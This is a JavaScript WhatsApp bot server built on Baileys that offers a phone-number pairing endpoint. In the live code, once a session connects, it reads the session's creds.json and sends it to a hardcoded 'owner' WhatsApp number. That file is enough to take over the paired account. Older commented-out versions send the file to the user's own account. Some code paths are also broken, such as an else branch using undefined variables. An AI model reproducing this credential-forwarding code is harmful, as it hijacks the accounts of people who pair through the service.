const sessionName = "RA-ONE";
const donet = "wa.me/13234541422";
const owner = ["13234541422"]; // Put your number here ex: ["62xxxxxxxxx"]
const {
  default: sansekaiConnect,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  makeInMemoryStore,
  jidDecode,
  proto,
  getContentType,
  delay
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Boom } = require("@hapi/boom");
const fs = require("fs");
const axios = require("axios");

const express = require("express");
const app = express();
const Baileys = require("@whiskeysockets/baileys");
const Jimp = require('jimp');
const chalk = require("chalk");
const figlet = require("figlet");
const _ = require("lodash");

const PhoneNumber = require("awesome-phonenumber");


const store = makeInMemoryStore({ logger: pino().child({ level: "silent", stream: "store" }) });

const color = (text, color) => {
  return !color ? chalk.green(text) : chalk.keyword(color)(text);
};

function smsg(conn, m, store) {
  if (!m) return m;
  let M = proto.WebMessageInfo;
  if (m.key) {
    m.id = m.key.id;
    m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
    m.chat = m.key.remoteJid;
    m.fromMe = m.key.fromMe;
    m.isGroup = m.chat.endsWith("@g.us");
    m.sender = conn.decodeJid((m.fromMe && conn.user.id) || m.participant || m.key.participant || m.chat || "");
    if (m.isGroup) m.participant = conn.decodeJid(m.key.participant) || "";
  }
  if (m.message) {
    m.mtype = getContentType(m.message);
    m.msg = m.mtype == "viewOnceMessage" ? m.message[m.mtype].message[getContentType(m.message[m.mtype].message)] : m.message[m.mtype];
    m.body =
      m.message.conversation ||
      m.msg.caption ||
      m.msg.text ||
      (m.mtype == "listResponseMessage" && m.msg.singleSelectReply.selectedRowId) ||
      (m.mtype == "buttonsResponseMessage" && m.msg.selectedButtonId) ||
      (m.mtype == "viewOnceMessage" && m.msg.caption) ||
      m.text;
    let quoted = (m.quoted = m.msg.contextInfo ? m.msg.contextInfo.quotedMessage : null);
    m.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : [];
    if (m.quoted) {
      let type = getContentType(quoted);
      m.quoted = m.quoted[type];
      if (["productMessage"].includes(type)) {
        type = getContentType(m.quoted);
        m.quoted = m.quoted[type];
      }
      if (typeof m.quoted === "string")
        m.quoted = {
          text: m.quoted,
        };
      m.quoted.mtype = type;
      m.quoted.id = m.msg.contextInfo.stanzaId;
      m.quoted.chat = m.msg.contextInfo.remoteJid || m.chat;
      m.quoted.isBaileys = m.quoted.id ? m.quoted.id.startsWith("BAE5") && m.quoted.id.length === 16 : false;
      m.quoted.sender = conn.decodeJid(m.msg.contextInfo.participant);
      m.quoted.fromMe = m.quoted.sender === conn.decodeJid(conn.user.id);
      m.quoted.text = m.quoted.text || m.quoted.caption || m.quoted.conversation || m.quoted.contentText || m.quoted.selectedDisplayText || m.quoted.title || "";
      m.quoted.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : [];
      m.getQuotedObj = m.getQuotedMessage = async () => {
        if (!m.quoted.id) return false;
        let q = await store.loadMessage(m.chat, m.quoted.id, conn);
        return exports.smsg(conn, q, store);
      };
      let vM = (m.quoted.fakeObj = M.fromObject({
        key: {
          remoteJid: m.quoted.chat,
          fromMe: m.quoted.fromMe,
          id: m.quoted.id,
        },
        message: quoted,
        ...(m.isGroup ? { participant: m.quoted.sender } : {}),
      }));

      /**
       *
       * @returns
       */
      m.quoted.delete = () => conn.sendMessage(m.quoted.chat, { delete: vM.key });

      /**
       *
       * @param {*} jid
       * @param {*} forceForward
       * @param {*} options
       * @returns
       */
      m.quoted.copyNForward = (jid, forceForward = false, options = {}) => conn.copyNForward(jid, vM, forceForward, options);

      /**
       *
       * @returns
       */
      m.quoted.download = () => conn.downloadMediaMessage(m.quoted);
    }
  }
  if (m.msg.url) m.download = () => conn.downloadMediaMessage(m.msg);
  m.text = m.msg.text || m.msg.caption || m.message.conversation || m.msg.contentText || m.msg.selectedDisplayText || m.msg.title || "";
  /**
   * Reply to this message
   * @param {String|Object} text
   * @param {String|false} chatId
   * @param {Object} options
   */
  m.reply = (text, chatId = m.chat, options = {}) => (Buffer.isBuffer(text) ? conn.sendMedia(chatId, text, "file", "", m, { ...options }) : conn.sendText(chatId, text, m, { ...options }));
  /**
   * Copy this message
   */
  m.copy = () => exports.smsg(conn, M.fromObject(M.toObject(m)));

  /**
   *
   * @param {*} jid
   * @param {*} forceForward
   * @param {*} options
   * @returns
   */
  m.copyNForward = (jid = m.chat, forceForward = false, options = {}) => conn.copyNForward(jid, m, forceForward, options);

  return m;
}
const clearState = () => {
    try {
        fs.rmdirSync(`./${sessionName ? sessionName : "session"}`, { recursive: true });
    } catch (error) {
        console.error('Error clearing session folder:', error);
    }
};

clearState();



async function startHisoka() {
  const { state, saveCreds } = await useMultiFileAuthState(`./${sessionName ? sessionName : "session"}`);
  const { version, isLatest } = await fetchLatestBaileysVersion();
  console.log(`using WA v${version.join(".")}, isLatest: ${isLatest}`);
  console.log(
    color(
      figlet.textSync("RA-1", {
        font: "Standard",
        horizontalLayout: "default",
        vertivalLayout: "default",
        whitespaceBreak: false,
      }),
      "green"
    )
  );


  const client = Baileys.makeWASocket({
    printQRInTerminal: false,
    logger: pino({
      level: 'silent',
    }),
    browser: ['Chrome (Linux)', 'chrome', ''],
    auth: state,
  });


  if (!client.authState.creds.registered) {
    setTimeout(async () => {
      app.get('/login', async (req, res) => { // Make the callback function async
        const phoneNumber = req.query.phoneNumber;

        let code = await client.requestPairingCode(phoneNumber);
        res.status(200).json({ success: true, message: 'Authentication initiated', code: code });
        console.log(`Your Pairing Code : ${code}`); // Move this line inside the callback function
      });
    }, 2000);
  }else {
      res.status(400).json({ message: 'Something went wrong, please try again later', data: result ? result.data : 'Undefined result' });
  }



  store.bind(client.ev);

  client.ev.on("messages.upsert", async (chatUpdate) => {
    //console.log(JSON.stringify(chatUpdate, undefined, 2))
    try {
      mek = chatUpdate.messages[0];
      if (!mek.message) return;
      mek.message = Object.keys(mek.message)[0] === "ephemeralMessage" ? mek.message.ephemeralMessage.message : mek.message;
      if (mek.key && mek.key.remoteJid === "status@broadcast") return;
      if (!client.public && !mek.key.fromMe && chatUpdate.type === "notify") return;
      if (mek.key.id.startsWith("BAE5") && mek.key.id.length === 16) return;
      m = smsg(client, mek, store);
      require("./sansekai")(client, m, chatUpdate, store);
    } catch (err) {
      console.log(err);
    }
  });

  // Handle error
  const unhandledRejections = new Map();
  process.on("unhandledRejection", (reason, promise) => {
    unhandledRejections.set(promise, reason);
    console.log("Unhandled Rejection at:", promise, "reason:", reason);
  });
  process.on("rejectionHandled", (promise) => {
    unhandledRejections.delete(promise);
  });
  process.on("Something went wrong", function (err) {
    console.log("Caught exception: ", err);
  });

  // Setting
  client.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (decode.user && decode.server && decode.user + "@" + decode.server) || jid;
    } else return jid;
  };

  client.ev.on("contacts.update", (update) => {
    for (let contact of update) {
      let id = client.decodeJid(contact.id);
      if (store && store.contacts) store.contacts[id] = { id, name: contact.notify };
    }
  });

  client.getName = (jid, withoutContact = false) => {
    id = client.decodeJid(jid);
    withoutContact = client.withoutContact || withoutContact;
    let v;
    if (id.endsWith("@g.us"))
      return new Promise(async (resolve) => {
        v = store.contacts[id] || {};
        if (!(v.name || v.subject)) v = client.groupMetadata(id) || {};
        resolve(v.name || v.subject || PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber("international"));
      });
    else
      v =
        id === "0@s.whatsapp.net"
          ? {
              id,
              name: "WhatsApp",
            }
          : id === client.decodeJid(client.user.id)
          ? client.user
          : store.contacts[id] || {};
    return (withoutContact ? "" : v.name) || v.subject || v.verifiedName || PhoneNumber("+" + jid.replace("@s.whatsapp.net", "")).getNumber("international");
  };

  client.setStatus = (status) => {
    client.query({
      tag: "iq",
      attrs: {
        to: "@s.whatsapp.net",
        type: "set",
        xmlns: "status",
      },
      content: [
        {
          tag: "status",
          attrs: {},
          content: Buffer.from(status, "utf-8"),
        },
      ],
    });
    return status;
  };

  client.public = true;

  client.serializeM = (m) => smsg(client, m, store);
  client.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
      if (reason === DisconnectReason.badSession) {
        console.log(`Bad Session File, Please Delete Session and Scan Again`);
        process.exit();
      } else if (reason === DisconnectReason.connectionClosed) {
        console.log("Connection closed, reconnecting....");
        startHisoka();
      } else if (reason === DisconnectReason.connectionLost) {
        console.log("Connection Lost from Server, reconnecting...");
        startHisoka();
      } else if (reason === DisconnectReason.connectionReplaced) {
        console.log("Connection Replaced, Another New Session Opened, Please Restart Bot");
        process.exit();
      } else if (reason === DisconnectReason.loggedOut) {
        console.log(`Device Logged Out, Please Delete Folder Session RA-ONE and Scan Again.`);
        process.exit();
      } else if (reason === DisconnectReason.restartRequired) {
        console.log("Restart Required, Restarting...");
        startHisoka();
      } else if (reason === DisconnectReason.timedOut) {
        console.log("Connection TimedOut, Reconnecting...");
        startHisoka();
      } else {
        console.log(`Unknown DisconnectReason: ${reason}|${connection}`);
        startHisoka();
      }
    } else if (connection === "open") {
      await delay(20000);
      await client.sendMessage(owner + "@s.whatsapp.net", { text: `Hey Darling! It's Zero Two.` });
      let sessionXeon = await fs.readFileSync(`./${sessionName ? sessionName : "session"}/creds.json`);
      await delay(2000);
      const xeonses = await client.sendMessage(owner + "@s.whatsapp.net", { document: sessionXeon, mimetype: `application/json`, fileName: `creds.json` });
      await client.sendMessage(owner + "@s.whatsapp.net", { text: `⚠️Remember, this file is only for us⚠️` }, { quoted: xeonses });
      await delay(2000);
      // process.exit(0);
      console.log(color("Bot connected to the server", "green"));
      console.log(color("Hello, I'm Raone, the owner of this bot.\n\nFollow me on IG @nxt_7r :)", "yellow"));
      console.log(color("Type /menu to see the menu."));
/*       await client.sendMessage(owner + "@s.whatsapp.net", { text: `Zero Two deployed!\n\nCome visit me here:)\n${donet}` }); */

    }
    // console.log('Connected...', update)
  });

  client.ev.on("creds.update", saveCreds);

  const getBuffer = async (url, options) => {
    try {
      options ? options : {};
      const res = await axios({
        method: "get",
        url,
        headers: {
          DNT: 1,
          "Upgrade-Insecure-Request": 1,
        },
        ...options,
        responseType: "arraybuffer",
      });
      return res.data;
    } catch (err) {
      return err;
    }
  };

  client.sendImage = async (jid, path, caption = "", quoted = "", options) => {
    let buffer = Buffer.isBuffer(path)
      ? path
      : /^data:.*?\/.*?;base64,/i.test(path)
      ? Buffer.from(path.split`,`[1], "base64")
      : /^https?:\/\//.test(path)
      ? await await getBuffer(path)
      : fs.existsSync(path)
      ? fs.readFileSync(path)
      : Buffer.alloc(0);
    return await client.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted });
  };

  client.sendText = (jid, text, quoted = "", options) => client.sendMessage(jid, { text: text, ...options }, { quoted });

  client.cMod = (jid, copy, text = "", sender = client.user.id, options = {}) => {
    //let copy = message.toJSON()
    let mtype = Object.keys(copy.message)[0];
    let isEphemeral = mtype === "ephemeralMessage";
    if (isEphemeral) {
      mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
    }

    let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
    let content = msg[mtype];
    if (typeof content === "string") msg[mtype] = text || content;
    else if (content.caption) content.caption = text || content.caption;
    else if (content.text) content.text = text || content.text;
    if (typeof content !== "string")
      msg[mtype] = {
        ...content,
        ...options,
      };
    if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
    else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
    if (copy.key.remoteJid.includes("@s.whatsapp.net")) sender = sender || copy.key.remoteJid;
    else if (copy.key.remoteJid.includes("@broadcast")) sender = sender || copy.key.remoteJid;
    copy.key.remoteJid = jid;
    copy.key.fromMe = sender === client.user.id;

    return proto.WebMessageInfo.fromObject(copy);
  };

  return client;
}

startHisoka();

let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright(`Update ${__filename}`));
  delete require.cache[file];
  require(file);
});

 const PORT = process.env.PORT || process.env.SERVER_PORT || 27257;
 app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });






/* import express from 'express';
import { useMultiFileAuthState, delay,
       DisconnectReason,
       fetchLatestBaileysVersion,
       makeInMemoryStore,
       jidDecode,
    //   proto,
       getContentType, } from '@whiskeysockets/baileys';
import pino from 'pino';
import fs from 'fs';
import Baileys from '@whiskeysockets/baileys';

const app = express();
const sessionFolder = './Auth-Infos';


const store = makeInMemoryStore({ logger: pino().child({ level: "silent", stream: "store" }) });
const initAuthentication = async (phoneNumber, res) => {
    try {
        if (!fs.existsSync(sessionFolder)) {
            fs.mkdirSync(sessionFolder);
        }

        const { state, saveCreds } = await useMultiFileAuthState(sessionFolder);

        if (!phoneNumber || phoneNumber.length < 11) {
            return res.status(400).json({ success: false, message: 'Invalid phone number' });
        }

      const Raone = Baileys.makeWASocket({
        printQRInTerminal: false,
        logger: pino({
          level: 'silent',
        }),
        browser: ['Chrome (Linux)', 'chrome', ''],
        auth: state,
      });


      setTimeout(async () => {
          let code = await Raone.requestPairingCode(phoneNumber);
          res.status(200).json({ success: true, message: 'Authentication initiated', code: code });
      }, 2000);
      
      store.bind(Raone.ev);

        Raone.ev.on('creds.update', saveCreds);

        Raone.ev.on("connection.update", async (s) => {
            const { connection, lastDisconnect } = s;
            if (connection == "open") {
                await delay(10000);
                await Raone.sendMessage(Raone.user.id, { text: `IT"S ZERO-TWO SENPAI.` });
                let sessionXeon = await fs.promises.readFile('./Auth-Infos/creds.json');
                await delay(2000);
                const xeonses = await Raone.sendMessage(Raone.user.id, { document: sessionXeon, mimetype: `application/json`, fileName: `creds.json` });
                await Raone.sendMessage(Raone.user.id, { text: `⚠️Do not share this file with anybody⚠️` }, { quoted: xeonses });
                await delay(2000);
                process.exit(0);
            }
            if (
                connection === "close" &&
                lastDisconnect &&
                lastDisconnect.error &&
                lastDisconnect.error.output.statusCode != 401
            ) {
                clearState();
            }
        });


    } catch (error) {
        console.error('Error occurred during login:', error);
        res.status(500).json({ success: false, message: 'Internal Server Error' });
    }
};

const clearState = () => {
    try {
        fs.rmdirSync(sessionFolder, { recursive: true });
    } catch (error) {
        console.error('Error clearing session folder:', error);
    }
};



process.on('uncaughtException', function (err) {
    let e = String(err);
    if (e.includes('Socket connection timeout')) return;
    if (e.includes('rate-overlimit')) return;
    if (e.includes('Connection Closed')) return;
    if (e.includes('Timed Out')) return;
    if (e.includes('Value not found')) return;
    console.log('Caught exception:', err);
});

const PORT = process.env.PORT || process.env.SERVER_PORT || 27257;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

app.get('/login', (req, res) => {
    const phoneNumber = req.query.phoneNumber;
  clearState();
    initAuthentication(phoneNumber, res);
});


















/* import express from 'express';
import { delay, useMultiFileAuthState, BufferJSON, fetchLatestBaileysVersion, PHONENUMBER_MCC, DisconnectReason, makeInMemoryStore, jidNormalizedUser, makeCacheableSignalKeyStore } from '@whiskeysockets/baileys';
const {
    default: makeWASocket,
    makeWALegacySocket,
    proto,
    downloadContentFromMessage,
    jidDecode,
    areJidsSameUser,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    WAMessageStubType,
    extractMessageContent, 

} = (await import('@whiskeysockets/baileys')).default

import chalk from 'chalk'
import pino from 'pino';
import NodeCache from 'node-cache';
import readline from 'readline';
import fs from 'fs';

const app = express();
const PORT = process.env.PORT || process.env.SERVER_PORT || 27257;
let clearState = () => {
  fs.rmdirSync(sessionFolder,{ recursive: true, })
}

const sessionFolder = './Auth-Infos';
app.get('/login', async (req, res) => {
    const phoneNumber = req.query.phoneNumber;

    try {
      const result = await WAlogin(phoneNumber);


      (async () => {
          try {
              if (fs.existsSync(sessionFolder)) {
                  await fs.promises.rm(sessionFolder, { recursive: true });
              }

              if (!fs.existsSync(sessionFolder)) {
                  fs.mkdirSync(sessionFolder);
              }
          } catch (error) {
              console.error('Error:', error);
          }
      })();
      console.log(result);
      if (result && result.success) { // Check if result is defined before accessing properties
          res.status(200).json({ message: 'Pairing code sent successfully!', code: result.data });
      } else {
          res.status(400).json({ message: 'Something went wrong, please try again later', data: result ? result.data : 'Undefined result' });
      }
    } catch (error) {
        console.error('Error occurred during login:', error);
        res.status(500).send('Internal Server Error');
    }
});

const WAlogin = async (phoneNumber) => {

  try {

    const { state, saveCreds } = await useMultiFileAuthState(sessionFolder);
    const msgRetryCounterCache = new NodeCache();
    let Raone = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        browser: ['Chrome (Linux)', '', ''],
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'fatal' }).child({ level: 'fatal' })),
        },
        markOnlineOnConnect: true,
        generateHighQualityLinkPreview: true,
        getMessage: async (key) => {
            let jid = jidNormalizedUser(key.remoteJid);
            let msg = await store.loadMessage(jid, key.id); // Assuming `store` is defined elsewhere
            return msg?.message || '';
        },
        msgRetryCounterCache,
        defaultQueryTimeoutMs: undefined,
    });

    if ( !Raone.authState.creds.registered) {
        // Check if we need to request a pairing code
        if (!!phoneNumber) {
            phoneNumber = phoneNumber.replace(/[^0-9]/g, "");
            if (!Object.keys(PHONENUMBER_MCC).some((v) => phoneNumber.startsWith(v))) {
                return { success: false, data: 'Start with country code of your WhatsApp Number, Example : +916909137213' };
            }
        }

/*         // Request pairing code and wait for it
        let result = await new Promise((resolve, reject) => {
            setTimeout(async () => {
                try {
                    let code = await Raone.requestPairingCode(phoneNumber);
                    code = code?.match(/.{1,4}/g)?.join("-") || code;
                    console.log(chalk.black(chalk.bgGreen(`Your Pairing Code : `)), chalk.black(chalk.white(code)));
                    resolve({ success: true, data: code }); // Resolve the promise with the result
                } catch (error) {
                    reject(error); // Reject with error if any
                }
            }, 3000);
        }); 
        if(phoneNumber.length < 11) {
         return console.error(`Please Enter Your Number With Country Code !!`);
        } 
        setTimeout(async () => {
          let code = await Raone.requestPairingCode(phoneNumber);
      console.log(`Your Pairing Code : ${code}`)
           return { success: true, data: code }; // Return the result
          }, 2000);
    }
    // Adding the 'creds.update' event listener
    Raone.ev.on('creds.update', saveCreds);


  // Event listener for connection update
  Raone.ev.on("connection.update", async (s) => {
      const { connection, lastDisconnect } = s;
      if (connection == "open") {
          await delay(10000); // Adjusted delay to 10 seconds (in milliseconds)
          // Sending a message to an undefined user (XeonBotInc.user.id)
          // Update this part as needed
          await Raone.sendMessage(Raone.user.id, { text: `IT"S ZERO-TWO SENPAI.` });
          let sessionXeon = fs.readFile('./Auth-Infos/creds.json');
          await delay(2000); // Adjusted delay to 2 seconds (in milliseconds)
          const xeonses = await Raone.sendMessage(Raone.user.id, { document: sessionXeon, mimetype: `application/json`, fileName: `creds.json` });
          await Raone.sendMessage(Raone.user.id, { text: `⚠️Do not share this file with anybody⚠️` }, { quoted: xeonses });
          await delay(2000); // Adjusted delay to 2 seconds (in milliseconds)
          process.exit(0);
      }
      if (
          connection === "close" &&
        
          lastDisconnect &&
          lastDisconnect.error &&
          lastDisconnect.error.output.statusCode != 401
      ) {
        clearState()
      }
  });



  process.on('uncaughtException', function (err) {
    let e = String(err);
    if (e.includes('Socket connection timeout')) return;
    if (e.includes('rate-overlimit')) return;
    if (e.includes('Connection Closed')) return;
    if (e.includes('Timed Out')) return;
    if (e.includes('Value not found')) return;
    console.log('Caught exception: ', err);
});
  } catch (error) {
    console.log(error)

  }


};


app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});


 */ 